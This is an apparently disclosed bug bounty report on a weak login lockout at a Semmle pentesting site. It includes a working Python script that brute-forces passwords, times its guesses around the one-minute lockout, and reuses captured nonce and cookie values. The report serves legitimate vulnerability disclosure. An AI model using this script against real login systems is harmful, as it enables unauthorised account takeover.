# the login blocking mechanism does not work correctly

## Report Details
- **Report ID**: 504362
- **URL**: https://hackerone.com/reports/504362
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-03-03T03:00:43.856Z
- **Disclosed**: 2019-03-19T11:58:46.854Z

## Reporter
- **Username**: aufzayed
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semmle

## Vulnerability Information
## Summary:
The login block mechanism does not work correctly because it blocks the login for 1 minute and allows you to sign in again many times with specific pattern by allowing login 2 or 3 times after 1 minute

## Exploitation

1. open https://lgtm-com.pentesting.semmle.net/
2. try to login with valid E-mail and __do not__ use the correct password
3. user proxy to intercept requests
4. extract __nonce__ parameter and __cookies__
6. add email and passwords list and the values your are extracted at the following script

python3
```
import requests
import time

with open('passwords list path', 'r') as passwords:
    passwd_index = 0
    for passwd in passwords:
        passwd = passwd.split('\n')[0]
        HEADERS = {
	        'Host': 'lgtm-com.pentesting.semmle.net',
	        'Content-Type': 'application/x-www-form-urlencoded',
	        'Content-Length': '238',
	        'Cookie': ''
        }

        DATA = {
	        'email': 'your valid email',
	        'password': passwd,
	        'nonce': '',
	        'apiVersion': 'b5b3337fa392c83c27f4e05efc4ccbcb2dcf6cbf'

        }

        login = requests.post('https://lgtm-com.pentesting.semmle.net/internal_api/v0.2/login', headers=HEADERS, data=DATA)
        if login.status_code == 200:
            print(f'[#] {passwd}')
            break
        elif login.status_code == 400:
            print('[!] sleep 60s')
            time.sleep(60)
        elif login.status_code == 401:
            print(f'[{passwd_index}] {passwd}')
            time.sleep(5)
        else:
            print(login.status_code)
        passwd_index += 1
 ```

Then watch the results

## Impact

Can take over user account

## Attachments
No attachments
